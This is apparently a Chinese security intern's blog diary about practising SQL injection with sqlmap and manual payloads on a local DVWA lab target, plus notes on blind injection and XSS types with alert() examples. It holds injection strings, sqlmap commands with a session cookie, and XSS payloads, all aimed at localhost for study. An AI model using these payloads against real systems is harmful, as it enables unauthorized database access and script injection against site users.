+++
title: '实习记录Day5'
date: 2025-07-25T22:00:00+0000
draft = false
+++


# 实习Day5

## 预计学习任务清单：

- [x] 使用phpstudy完成sqlmap测试

- [ ] 用sqlmao4burp++实现bp的sql测试

- [ ] 学习《网络安全自学篇》系列文章

## 日程记录

1. 昨天临走的时候胃疼，昨晚也是，所以早上来的时候先去药房买了点药

2. 检查出问题，原因是DVWA的版本及名称不同，而访问的路径应该为`http://localhost/站点域名`，而站点域名应该与`网站目录：/phpstudy安装目录/www/站点域名/`中的保持一致

3. 测试时出现如下问题
   
   使用指令

```bash
python sqlmap.py -u"http://127.0.0.1/DVWA-2.5/vulnerabilities/sqli/?id=2&Submit=Submit"
```

之后提示进行重定向，显示如下

```bash
got a 302 redirect to 'http://127.0.0.1/DVWA-2.5/login.php'. Do you want to follow? [Y/n] y
```

    也就是说，sql访问该靶机的时候，直接被重定向到了登录界面，随后便只能对登录界面进行sql注入，这显然是必然失败的。所以现在必须要解决这个问题
通过询问小鲸鱼得知，可以用有效的cookie信息跳过重定向，从而直接访问，所以使用如下指令

```bash
python sqlmap.py -u "http://127.0.0.1/DVWA-2.5/vulnerabilities/sqli/?id=2&Submit=Submit" \ --cookie="PHPSESSID=您的会话ID; security=low"
```

    其中我登录时的包中的cookie信息如下：

| PHPSESSID | "eiq9td1n642e570cgm3i2lfs4k" |
| --------- | ---------------------------- |
| security  | "low"                        |

    随后就成功进行了漏洞检测

4. 经过和他们聊天，他们表示用靶机最好，巧了刚装的DVWA就是靶机

5. 下午不知道该干啥了，目前查过的资料基本就那么多了，睡一觉起来啥都不相干，烦
   
   不过倒是注意到之前看的那个大佬的系列文章，也就是这一系列 [网络安全自学篇_Eastmount的博客-CSDN博客](https://blog.csdn.net/eastmount/category_9183790_3.html) 50￥，目前124篇，其实算是很便宜了，作为技术文来说的话。

6. 狠下心买了，认真学吧，心疼钱啊
   
   学习到SQL通过http的方式进行的注入，目前使用过的有
   
   ```http
   #判断注入点
   http://127.0.0.1/DVWA-2.5/vulnerabilities/sqli/?id=1' and1=1 -- Submit=Submit
   http://127.0.0.1/DVWA-2.5/vulnerabilities/sqli/?id=1' and1=2 -- Submit=Submit
   ```
   
   理论上这两个应该有区别，但是却没有任何显示
   
   在随后的查询中，查询到这篇文章 [网络安全-靶机dvwa之sql注入Low到High详解（含代码分析）_dvwa sql注入低中高代码分析-CSDN博客](https://blog.csdn.net/lady_killer9/article/details/108983997) 
   
   从这之中了解到，DVWA直接由User ID测试注入即可。接下来依次测试
   
   PS：在DVWA中，参数后不跟`--`而是`#`，且无需空格
   
   ```
   ##注入点
   1 and 1=1#
   1 and 1=2#
   1' and 1=1#
   1' and 1=2#
   
   ##判断字段总数
   1' order by 1#
   1' order by 10# (x)
   1' order by 5# (x)
   1' order by 3# (x)
   1' order by 2#
   可知一共就2个字段
   
   ##获取显示位 union
   1' union all select null,null# (根据字段数设置null数量，2字段对应2个)
   随后依次替换null为数字，测试哪几个字段有结果，如果报错则替换回null
   1' union all select 1,null#
   1' union all select 2,null#(会显示两个)
   1' union all select 1,1#(会显示两个)
   1’ union all select 1,2#
   1’ union all select 2,2#
   ...etc
   实际上所有数字都可以，很奇怪
   -1’ union all select 1,1#
   这个不显示，很难绷，后续的都建立在'-1'的基础上没法学
   ```
   
   剩下的DWVA的注入，参考上面查询到的文章吧

7. 再次学习SQLMAP  参考这篇文章 [[渗透&amp;攻防] 二.SQL MAP工具从零解读数据库及基础用法_the sql query provided does not return any output-CSDN博客](https://blog.csdn.net/Eastmount/article/details/75269811) 
   
   其实没有太大必要去读之前的文章，直接读系列文章就行
   从[[网络安全自学篇] 一.入门笔记之看雪Web安全学习及异或解密示例-CSDN博客](https://blog.csdn.net/Eastmount/article/details/97784774?spm=1001.2101.3001.10752) 开始

8. sql注入简介
   
   ```sql
   1.回显注入
   注入数据后会改变当前页面的数据
   2.报错注入
   注入报错信息造成数据库返回异常码，其中抛出敏感信息
   3.盲注
   分为布尔盲注和时间盲注
   布尔盲注就是加入类似于这种表达式
   'and (select substr(email_id,1,1) from emails where id=3) > 'a'
   随后便根据这个，不停地进行判断，再通过变化a，就能套出数据
   时间盲注就是利用库中的IF函数，通过获得第一个字符的ascii码，
   判断该字符是否大于115，不成立则5秒后返回。再通过返回时间判断是不是有注入
   ```

9. XSS(跨站攻击脚本)
   
   利用开发时遗留的漏洞，通过注入恶意指令代码到网页，从而让用户加载并执行攻击者恶意制造的网页程序
   
   ```html
   1.反射型
   对于该代码
   <dvi>搜索(test</div><script>alert(123)</script>)结果如下</div>
   将改为其
   <div>搜索(" onmouseover="alert('XSS')" x="</div>)结果如下</div>
   当用户将鼠标悬停在搜索文本区域时，会触发弹窗显示"XSS"
   本质上是对于<script>中间的内容进行更改，从而达到执行恶意代码的效果
   2.存储型
   利用网页存储的数据，在一些数据，比如个人资料之中加入<script>
   当他人访问于这个人有关的网页时，链接不会显示出这个Script的代码，但是打开后由于加载了个人资料
   从而触发恶意代码
   3.DOM型(DAY6完成该部分及以后的内容)
   利用参数过滤器，将特定的字符转化为转义后的恶意代码标签
   当访问WEB时，会触发转义，并使得特定字符还原成恶意代码
   从而触发恶意代码
   ```

### 人员记录

石哥

员工：张哥
